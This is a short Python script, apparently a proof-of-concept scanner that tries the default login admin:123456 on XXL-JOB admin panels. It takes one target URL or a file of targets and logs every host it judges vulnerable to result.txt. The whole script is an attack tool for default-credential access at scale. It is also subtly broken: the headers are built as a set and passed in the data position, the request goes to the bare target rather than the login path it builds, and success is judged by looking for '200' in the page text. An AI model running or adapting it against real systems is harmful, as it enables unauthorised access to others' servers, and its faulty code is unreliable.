#-*- coding: utf-8 -*-
import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
    $$\   $$\ $$\   $$\ $$\            $$$$$\  $$$$$$\  $$$$$$$\  
    $$ |  $$ |$$ |  $$ |$$ |           \__$$ |$$  __$$\ $$  __$$\ 
    \$$\ $$  |\$$\ $$  |$$ |              $$ |$$ /  $$ |$$ |  $$ |
     \$$$$  /  \$$$$  / $$ |$$$$$$\       $$ |$$ |  $$ |$$$$$$$\ |
     $$  $$<   $$  $$<  $$ |\______|$$\   $$ |$$ |  $$ |$$  __$$\ 
    $$  /\$$\ $$  /\$$\ $$ |        $$ |  $$ |$$ |  $$ |$$ |  $$ |
    $$ /  $$ |$$ /  $$ |$$$$$$$$\   \$$$$$$  | $$$$$$  |$$$$$$$  |
    \__|  \__|\__|  \__|\________|   \______/  \______/ \_______/ 

                       tag:  XXL-JOB   poc                                       
             @version:1.0.0             @author: dkop        
    """
    print(test)


def poc(target):
    url = target+"/login"
    headers={
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        " Chrome/109.0.5414.120 Safari/537.36",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = {
        'userName':'admin',
        'password':'123456'
    }
    try:
        res = requests.post(target ,headers,data,verify=False,timeout=5).text
        if '200' in res:
            print(f"[+] {target} is vulable,[admin:123456]")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} is not vulable")

    except:
        print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description=' admin  Password')
    parser.add_argument("-u", "--url", dest="url", type=str)
    parser.add_argument("-f", "--file", dest="file", type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()